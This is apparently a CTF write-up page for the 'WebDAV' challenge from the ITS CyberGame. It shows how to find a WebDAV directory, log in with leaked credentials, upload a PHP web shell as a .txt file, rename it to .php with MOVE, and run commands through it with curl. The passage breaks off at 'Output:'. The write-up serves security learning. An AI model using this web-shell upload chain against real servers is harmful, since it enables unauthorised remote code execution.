@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="preload" href="/assets/fonts/oxanium-variable.ttf" as="font" type="font/ttf" crossorigin />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    
+    
+    <meta name="author" content="Gianluca Bassani" />
+
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    <!-- Single Page App redirect receiver for GitHub Pages -->
+    <script type="text/javascript">
+      (function(l) {
+        if (l.search[1] === '/' ) {
+          var decoded = l.search.slice(1).split('&').map(function(s) { 
+            return s.replace(/~and~/g, '&')
+          }).join('?');
+          window.history.replaceState(null, null,
+              l.pathname.slice(0, -1) + decoded + l.hash
+          );
+        }
+      }(window.location))
+    </script>
+    <script type="module" crossorigin src="/assets/index-Bt1iUacl.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-BFjX5Hv_.css">
+  
+    <link rel="stylesheet" href="/assets/ArticlePage-BEHUn5zE.css" />
+    <title>WebDAV | Gianluca Bassani</title>
+    <meta name="description" content="Discover a WebDAV endpoint via fuzzing and exploit unsafe HTTP methods to bypass file upload restrictions and achieve RCE." />
+    <link rel="canonical" href="https://gianlucabassani.gitlab.io/ctf/webdav/" />
+    <meta property="og:title" content="WebDAV | Gianluca Bassani" />
+    <meta property="og:description" content="Discover a WebDAV endpoint via fuzzing and exploit unsafe HTTP methods to bypass file upload restrictions and achieve RCE." />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://gianlucabassani.gitlab.io/ctf/webdav/" />
+    <meta property="og:site_name" content="Gianluca Bassani" />
+    <meta property="og:image" content="https://gianlucabassani.gitlab.io/assets/previews/ctf-webdav.png" />
+    <meta property="og:image:alt" content="WebDAV | Gianluca Bassani" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="article:published_time" content="2026-03-27" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="WebDAV | Gianluca Bassani" />
+    <meta name="twitter:description" content="Discover a WebDAV endpoint via fuzzing and exploit unsafe HTTP methods to bypass file upload restrictions and achieve RCE." />
+    <meta name="twitter:image" content="https://gianlucabassani.gitlab.io/assets/previews/ctf-webdav.png" />
+    <meta name="twitter:image:alt" content="WebDAV | Gianluca Bassani" />
+</head>
+
+  <body>
+    <div id="root"><a class="skip-link" href="#route-content">Skip to content</a><div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events:none"><ol tabindex="-1" class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]"></ol></div><header class="site-navigation"><svg class="site-navigation-frame site-navigation-frame-desktop" viewBox="0 0 1200 88" preserveAspectRatio="none" aria-hidden="true"><path class="site-navigation-surface" d="M20 1H1167L1199 25V69H440L422 87H1V20Z"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-3;--trace-next:-40;--trace-last:-74;stroke-dasharray:2.8 97.2;animation-duration:8.3s;animation-delay:-2.1s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-17;--trace-next:-54;--trace-last:-88;stroke-dasharray:1.4 98.6;animation-duration:11.7s;animation-delay:-7.6s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-31;--trace-next:-68;--trace-last:-2;stroke-dasharray:3.6 96.4;animation-duration:9.1s;animation-delay:-4.8s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-44;--trace-next:-81;--trace-last:-15;stroke-dasharray:1.8 98.2;animation-duration:13.3s;animation-delay:-9.2s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-53;--trace-next:-90;--trace-last:-24;stroke-dasharray:2.4 97.6;animation-duration:7.7s;animation-delay:-1.3s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-66;--trace-next:-3;--trace-last:-37;stroke-dasharray:3.2 96.8;animation-duration:10.9s;animation-delay:-6.4s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-78;--trace-next:-15;--trace-last:-49;stroke-dasharray:1.2 98.8;animation-duration:12.7s;animation-delay:-3.5s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-88;--trace-next:-25;--trace-last:-59;stroke-dasharray:2.1 97.9;animation-duration:9.7s;animation-delay:-8.1s"></path></svg><svg class="site-navigation-frame site-navigation-frame-mobile" viewBox="0 0 400 82" preserveAspectRatio="none" aria-hidden="true"><path class="site-navigation-surface" d="M10 1H389L399 11V73L391 81H1V10Z"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-3;--trace-next:-40;--trace-last:-74;stroke-dasharray:2.8 97.2;animation-duration:8.3s;animation-delay:-2.1s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-17;--trace-next:-54;--trace-last:-88;stroke-dasharray:1.4 98.6;animation-duration:11.7s;animation-delay:-7.6s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-31;--trace-next:-68;--trace-last:-2;stroke-dasharray:3.6 96.4;animation-duration:9.1s;animation-delay:-4.8s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-44;--trace-next:-81;--trace-last:-15;stroke-dasharray:1.8 98.2;animation-duration:13.3s;animation-delay:-9.2s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-53;--trace-next:-90;--trace-last:-24;stroke-dasharray:2.4 97.6;animation-duration:7.7s;animation-delay:-1.3s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-66;--trace-next:-3;--trace-last:-37;stroke-dasharray:3.2 96.8;animation-duration:10.9s;animation-delay:-6.4s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-78;--trace-next:-15;--trace-last:-49;stroke-dasharray:1.2 98.8;animation-duration:12.7s;animation-delay:-3.5s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-88;--trace-next:-25;--trace-last:-59;stroke-dasharray:2.1 97.9;animation-duration:9.7s;animation-delay:-8.1s"></path></svg><div class="site-navigation-inner"><a class="site-brand" aria-label="Gianluca Bassani home" href="/"><span class="site-brand-copy"><span class="site-brand-name">Gianluca<span class="site-brand-break"><br/></span> Bassani</span><small><strong>0xPr1m3</strong><span class="site-brand-separator" aria-hidden="true">·</span><span class="site-brand-role">Cybersecurity</span></small></span></a><button class="site-menu-toggle" type="button" aria-controls="site-menu" aria-expanded="false" aria-label="Open navigation"><svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><nav id="site-menu" aria-label="Main navigation" class="site-menu"><a href="/about">About Me</a><a href="/projects">Projects</a><a href="/blog">Blog</a><a href="/boxes">Box Writeups</a><a aria-current="page" href="/ctf">CTF Solves</a><a href="/skills">Skills</a><a class="site-console-link" href="/terminal">CLI <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up-right" aria-hidden="true"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></nav></div></header><div id="route-content" tabindex="-1"><!--$--><div class="min-h-screen bg-background cyber-grid reader-page relative"><div aria-hidden="true" class="page-ambient page-ambient-scattered" style="--ambient-primary:hsl(38,92%,50%);--ambient-secondary:hsl(45,93%,58%);--ambient-tertiary:hsl(38,92%,50%)"></div><div class="fixed top-0 left-0 w-full h-1 bg-muted z-50"><div class="h-full bg-gradient-yellow transition-all duration-100" style="width:0%"></div></div><div class="bg-background/80 backdrop-blur-sm border-b border-border relative z-10"><div class="reader-header mx-auto px-4 py-4"><div class="article-navigation"><nav aria-label="Article navigation"><a class="site-button inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 site-button-outline min-h-11 px-4 py-2 article-back-link" data-size="default" href="/"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left" aria-hidden="true"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg>Back to Home</a></nav><div class="article-reading-tools"><span><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>2<!-- --> min read</span><button type="button"><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-link" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Copy link</button><span role="status"></span></div></div><div class="flex flex-wrap items-center gap-x-4 gap-y-2 mb-4"><div class="inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 hover:bg-secondary/15 tag bg-warning/20 border-warning/40 text-warning">MEDIUM</div><span class="text-2xl">🌐</span><span class="text-sm text-muted-foreground font-mono">200<!-- --> pts</span></div><h1 class="text-2xl sm:text-3xl font-display font-bold reader-title mb-2">WebDAV</h1><div class="flex flex-wrap items-center gap-x-4 gap-y-2 text-sm text-muted-foreground"><div class="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar w-4 h-4"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg>27 Mar 2026</div><div class="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-trophy w-4 h-4"><path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6"></path><path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18"></path><path d="M4 22h16"></path><path d="M10 14.66V17c0 .55-.47.98-.97 1.21C7.85 18.75 7 20.24 7 22"></path><path d="M14 14.66V17c0 .55.47.98.97 1.21C16.15 18.75 17 20.24 17 22"></path><path d="M18 2H6v7a6 6 0 0 0 12 0V2Z"></path></svg>ITS CyberGame</div></div></div></div><main id="main-content" class="reader-layout reader-container mx-auto relative z-10 " tabindex="-1"><aside class="reader-sidebar"><div class="reader-toc reader-toc-desktop"><p>On this page</p><nav aria-label="Article chapters"><a href="#section-description" class="">Description</a><a href="#section-knowledge" class="">Knowledge</a><a href="#section-installing-cadaver-optional" class="">Installing cadaver (Optional)</a><a href="#section-challenge-analysis" class="">Challenge Analysis</a><a href="#section-indexhtml" class="">index.html</a><a href="#section-exploitation-path" class="">Exploitation Path</a><a href="#section-1-enumeration" class="">1. Enumeration</a><a href="#section-2-propfind-directory-listing" class="">2. PROPFIND (Directory Listing)</a><a href="#section-using-cadaver-easier-way" class="reader-toc-subsection">Using cadaver (easier way)</a><a href="#section-3-put-move-bypass" class="">3. PUT + MOVE Bypass</a><a href="#section-upload-shell" class="reader-toc-subsection">Upload shell</a><a href="#section-rename-with-move" class="reader-toc-subsection">Rename with MOVE</a><a href="#section-same-thing-with-cadaver" class="reader-toc-subsection">Same thing with cadaver</a><a href="#section-4-rce" class="">4. RCE</a><a href="#section-get-the-flag" class="">Get the Flag</a><a href="#section-final-notes" class="">Final Notes</a></nav></div><details class="reader-toc reader-toc-mobile"><summary>On this page <span>16<!-- --> chapters</span></summary><nav aria-label="Article chapters"><a href="#section-description" class="">Description</a><a href="#section-knowledge" class="">Knowledge</a><a href="#section-installing-cadaver-optional" class="">Installing cadaver (Optional)</a><a href="#section-challenge-analysis" class="">Challenge Analysis</a><a href="#section-indexhtml" class="">index.html</a><a href="#section-exploitation-path" class="">Exploitation Path</a><a href="#section-1-enumeration" class="">1. Enumeration</a><a href="#section-2-propfind-directory-listing" class="">2. PROPFIND (Directory Listing)</a><a href="#section-using-cadaver-easier-way" class="reader-toc-subsection">Using cadaver (easier way)</a><a href="#section-3-put-move-bypass" class="">3. PUT + MOVE Bypass</a><a href="#section-upload-shell" class="reader-toc-subsection">Upload shell</a><a href="#section-rename-with-move" class="reader-toc-subsection">Rename with MOVE</a><a href="#section-same-thing-with-cadaver" class="reader-toc-subsection">Same thing with cadaver</a><a href="#section-4-rce" class="">4. RCE</a><a href="#section-get-the-flag" class="">Get the Flag</a><a href="#section-final-notes" class="">Final Notes</a></nav></details></aside><div class="reader-body"><section class="reader-summary" aria-label="Article introduction"><p class="reader-summary-text">Discover a WebDAV endpoint via fuzzing and exploit unsafe HTTP methods to bypass file upload restrictions and achieve RCE.</p><ul class="reader-summary-topics" aria-label="Topics"><li>WebDAV</li><li>RCE</li></ul></section><div style="--hover-theme:var(--theme-yellow)" class="rounded-lg border bg-card text-card-foreground shadow-sm relative overflow-hidden reader-article theme-yellow border-yellow-500/20 hover:ring-1 hover:ring-yellow-500/20"><div class="p-6 pt-0 reader-content"><div class="prose prose-invert prose-yellow reader-prose"><h2 id="section-description"><a href="#section-description" class="heading-link">Description</a></h2>
+<p><strong>ITA:</strong>
+&quot;Mio cuggino mi ha fatto il nuovo sito per la mia azienda! Bellissimo no? Sempre una persona piena di opzioni.&quot;</p>
+<p><strong>ENG:</strong>
+&quot;My cousin made me a new website for my company! It&#x27;s beautiful, isn&#x27;t it? Always full of options.&quot;</p>
+<hr/>
+<h2 id="section-knowledge"><a href="#section-knowledge" class="heading-link">Knowledge</a></h2>
+<p>This challenge revolves around <strong>WebDAV</strong>, an extension of HTTP that allows remote file management.</p>
+<p>Useful stuff to know:</p>
+<ul>
+<li>HTTP methods like <strong>OPTIONS</strong>, <strong>PROPFIND</strong>, <strong>PUT</strong>, <strong>MOVE</strong></li>
+<li>Tools like <code>curl</code> or a WebDAV client such as <code>cadaver</code></li>
+<li>Some valid credentials (which we’ll get easily)</li>
+</ul>
+<hr/>
+<h2 id="section-installing-cadaver-optional"><a href="#section-installing-cadaver-optional" class="heading-link">Installing cadaver (Optional)</a></h2>
+<p>If you want a nicer way to interact with WebDAV:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">apt-get install cadaver
+</code></pre></div>
+<hr/>
+<h2 id="section-challenge-analysis"><a href="#section-challenge-analysis" class="heading-link">Challenge Analysis</a></h2>
+<h2 id="section-indexhtml"><a href="#section-indexhtml" class="heading-link">index.html</a></h2>
+<p>The main page is a simple company page with an employee login portal.</p>
+<p>A couple of things stand out immediately:</p>
+<ul>
+<li>There’s an HTML comment saying credentials are basically in the placeholders</li>
+<li>Username: <code>user</code></li>
+<li>Password: <code>your_password</code></li>
+<li>Footer hint mentions “multiple communication options”</li>
+<li>Server is running Apache + PHP, so executing <code>.php</code> files is on the table</li>
+</ul>
+<hr/>
+<h2 id="section-exploitation-path"><a href="#section-exploitation-path" class="heading-link">Exploitation Path</a></h2>
+<p>High-level idea:</p>
+<ol>
+<li>Grab credentials leaked in the source code</li>
+<li>Fuzz for hidden directories (WebDAV)</li>
+<li>Abuse WebDAV methods</li>
+<li>Upload a shell</li>
+<li>Get the flag</li>
+</ol>
+<hr/>
+<h2 id="section-1-enumeration"><a href="#section-1-enumeration" class="heading-link">1. Enumeration</a></h2>
+<p>The login panel didn’t really do anything interesting, so I moved on to fuzzing.
+Used <code>ffuf</code> with <code>common.txt</code> and found:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>/webdav/
+</code></pre></div>
+<p>As soon as I saw that, it was nice since I had seen a similar WebDAV misconfig a few weeks before at work, so I had good feelings that this was probably the right path.</p>
+<p><strong>Check allowed methods</strong></p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">curl -i -X OPTIONS http://sfide2026.itscybergame.it:10146/webdav/
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>http</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="http block, horizontally scrollable"><code class="hljs language-http">HTTP/1.1 200 OK
+Server: Apache/2.4.66 (Debian)
+DAV: 1,2
+Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK
+</code></pre></div>
+<p>Seeing <code>PUT</code> and <code>MOVE</code> here is already very promising.</p>
+<hr/>
+<h2 id="section-2-propfind-directory-listing"><a href="#section-2-propfind-directory-listing" class="heading-link">2. PROPFIND (Directory Listing)</a></h2>
+<p>Now that we have creds, we can list files using WebDAV.</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">curl -i -X PROPFIND http://sfide2026.itscybergame.it:10146/webdav/ \
+  -u <span class="hljs-string">&quot;user:your_password&quot;</span> \
+  -H <span class="hljs-string">&quot;Depth: 1&quot;</span> \
+  -H <span class="hljs-string">&quot;Content-Type: application/xml&quot;</span> \
+  --data <span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;d:propfind xmlns:d=&quot;DAV:&quot;&gt;&lt;d:allprop/&gt;&lt;/d:propfind&gt;&#x27;</span>
+</code></pre></div>
+<p>Response shows:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>xml</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="xml block, horizontally scrollable"><code class="hljs language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">D:href</span>&gt;</span>/webdav/secret_folder/<span class="hljs-tag">&lt;/<span class="hljs-name">D:href</span>&gt;</span>
+</code></pre></div>
+<hr/>
+<h3 id="section-using-cadaver-easier-way"><a href="#section-using-cadaver-easier-way" class="heading-link">Using cadaver (easier way)</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">cadaver http://sfide2026.itscybergame.it:10143/webdav/
+</code></pre></div>
+<p>Login with:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>user / your_password
+</code></pre></div>
+<p>Then list files:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">dav:/webdav/&gt; <span class="hljs-built_in">ls</span>
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>secret_folder
+</code></pre></div>
+<hr/>
+<h2 id="section-3-put-move-bypass"><a href="#section-3-put-move-bypass" class="heading-link">3. PUT + MOVE Bypass</a></h2>
+<p>Uploading <code>.php</code> directly is blocked, so the strategy is:</p>
+<ul>
+<li>upload as <code>.txt</code></li>
+<li>rename it later to <code>.php</code></li>
+</ul>
+<h3 id="section-upload-shell"><a href="#section-upload-shell" class="heading-link">Upload shell</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">curl -i -X PUT <span class="hljs-string">&quot;http://sfide2026.itscybergame.it:10246/webdav/shell.txt&quot;</span> \
+  -u <span class="hljs-string">&quot;user:your_password&quot;</span> \
+  -H <span class="hljs-string">&quot;Content-Type: text/plain&quot;</span> \
+  --data <span class="hljs-string">&quot;&lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>
+</code></pre></div>
+<h3 id="section-rename-with-move"><a href="#section-rename-with-move" class="heading-link">Rename with MOVE</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">curl -i -X MOVE <span class="hljs-string">&quot;http://sfide2026.itscybergame.it:10246/webdav/shell.txt&quot;</span> \
+  -u <span class="hljs-string">&quot;user:your_password&quot;</span> \
+  -H <span class="hljs-string">&quot;Destination: http://sfide2026.itscybergame.it:10246/webdav/shell.php&quot;</span>
+</code></pre></div>
+<p>And just like that, filter bypassed.</p>
+<hr/>
+<h3 id="section-same-thing-with-cadaver"><a href="#section-same-thing-with-cadaver" class="heading-link">Same thing with cadaver</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">dav:/webdav/&gt; put shell.txt
+dav:/webdav/&gt; move shell.txt shell.php
+</code></pre></div>
+<hr/>
+<h2 id="section-4-rce"><a href="#section-4-rce" class="heading-link">4. RCE</a></h2>
+<p>Now we just use the shell:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">curl <span class="hljs-string">&quot;http://sfide2026.itscybergame.it:10246/webdav/shell.php?cmd=ls+secret_folder&quot;</span> \
+  -u <span class="hljs-string">&quot;user:your_password&quot;</span>
+</code></pre></div>
+<p>Output:</p>
